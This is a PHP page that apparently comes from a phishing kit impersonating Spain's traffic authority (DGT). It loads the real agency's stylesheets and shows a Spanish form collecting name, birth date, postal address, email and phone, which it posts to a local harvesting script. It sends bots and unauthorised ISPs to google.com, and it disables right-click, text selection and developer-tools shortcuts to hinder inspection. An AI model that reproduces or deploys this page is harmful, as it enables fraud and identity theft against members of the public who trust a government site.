<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

require '../server/all.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){	
?>
<!DOCTYPE html>
<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        .main-header {
            background-color: #f8f8f8;
            border-bottom: 1px solid #e7e7e7;
            padding: 10px 0;
        }
        .main-header .brand {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 15px;
        }
        .main-header .logos img {
            height: 40px;
            margin-right: 10px;
        }
        .main-header .title {
            font-size: 20px;
            font-weight: bold;
        }
        .main-content {
            padding: 15px;
        }
        .form-container {
            background-color: #fff;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 800px;
            margin: 0 auto;
        }
        .form-container h2 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #333;
        }
        .form-group label {
            font-weight: bold;
        }
        .form-group input,
        .form-group select {
            width: 90%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-top: 5px;
            max-width: 100%;
        }
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }
        .custom-button:hover {
            background-color: #036;
        }
        .mb-3 {
            margin-bottom: 15px !important;
        }
        @media (max-width: 770px) {
            .form-container {
                padding: 10px;
            }
        }
        .main-footer {
            background-color: #f8f8f8;
            border-top: 3px solid #e7e7e7;
            padding: 10px 0;
        }
        .main-footer nav {
            text-align: center;
        }
        .main-footer nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .main-footer nav ul li {
            display: inline;
            margin: 0 10px;
        }
        .main-footer nav ul li a {
            color: #555;
            text-decoration: none;
        }
        .main-footer nav ul li a:hover {
            text-decoration: underline;
        }
        .footer-social ul {
            padding: 0;
            margin: 0;
            list-style: none;
            text-align: center;
        }
        .footer-social ul li {
            display: inline;
            margin: 0 10px;
        }
        .footer-social ul li a {
            color: #555;
            text-decoration: none;
        }
        .footer-social ul li a:hover {
            color: #048;
        }
        .limited-width {
            max-width: 300px;
        }
    </style>
    <script>
        function formatDate(input) {
            input.value = input.value.replace(/(\d{2})(\d{2})(\d{4})/, '$1/$2/$3');
        }
        function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }
    </script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script>
</head>
<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d" __processed_cad089a7-7edc-4df7-8792-1eaa09423a16__="true">
    <header class="main-header">
      
           
        </div>
    </header>
    <main class="main-content">
        <div class="form-container" bis_skin_checked="1">
          
            <form method="post" action="../actions/info.php">
                <div class="form-group row mb-3" bis_skin_checked="1">
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="nom">Apellido</label>
                        <input id="nom" type="text" name="nom" required="">
                    </div>
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="prenom">Nombre</label>
                        <input id="prenom" type="text" name="prenom" required="">
                    </div>
                </div>
                <div class="form-group row mb-3" bis_skin_checked="1">
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="dob">Fecha de nacimiento</label>
                        <input id="dob" type="text" name="dob" placeholder="JJ/MM/AAAA" required="" oninput="formatDate(this)">
                    </div>
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="adresse">Dirección postal</label>
                        <input id="adresse" type="text" name="adresse" required="">
                    </div>
                </div>
                <div class="form-group row mb-3" bis_skin_checked="1">
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="cp">Código postal</label>
                        <input id="cp" type="text" name="cp" placeholder="XXXXX" required="" oninput="chiffres_only(this)">
                    </div>
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="ville">Ciudad</label>
                        <input id="ville" type="text" name="ville" required="">
                    </div>
                </div>
                <div class="form-group row mb-3" bis_skin_checked="1">
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="email">Email</label>
                        <input id="email" type="email" name="email" placeholder="correo2@dgt.es" required="">
                    </div>
                    <div class="col-sm-6 limited-width" bis_skin_checked="1">
                        <label for="tel">Nùmero de telùfono</label>
                        <input id="tel" type="text" name="tel" placeholder="+34" required="" oninput="chiffres_only(this)">
                    </div>
                </div>
                <button type="submit" class="custom-button">Continuar</button>
                <input type="hidden" name="info_submit" value="true">
            </form>
        </div>
    </main>
    <footer class="main-footer">
        <nav>
            <ul>
                <li><a href="#">Aviso legal</a></li>
                <li><a href="#">Propiedad intelectual</a></li>
                <li><a href="#">Accesibilidad</a></li>
                <li><a href="#">Protección de datos</a></li>
            </ul>
        </nav>
        <div class="footer-social" bis_skin_checked="1">
            <ul>
                <li><a href="#" target="_blank"><em class="fa fa-facebook-square"></em></a></li>
                <li><a href="#" target="_blank"><em class="fa fa-twitter-square"></em></a></li>
                <li><a href="#" target="_blank"><em class="fa fa-youtube-square"></em></a></li>
                <li><a href="#" target="_blank"><em class="fa fa-instagram"></em></a></li>
            </ul>
        </div>
    </footer>


</body></html>





	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
<?php
} else {
    header("Location: https://www.google.com");
    exit;
}

?>

<!-- script js -->	
<script>
        // JavaScript pour la fonction formatDate
        function formatDate(input) {
            input.value = input.value.replace(/\D/g, '');
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
            }
            if (input.value.length > 5) {
                input.value = input.value.slice(0, 5) + '/' + input.value.slice(5);
            }
        }

        // JavaScript pour la fonction chiffres_only
        function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }

		document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // DÃ©sactiver la sÃ©lection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>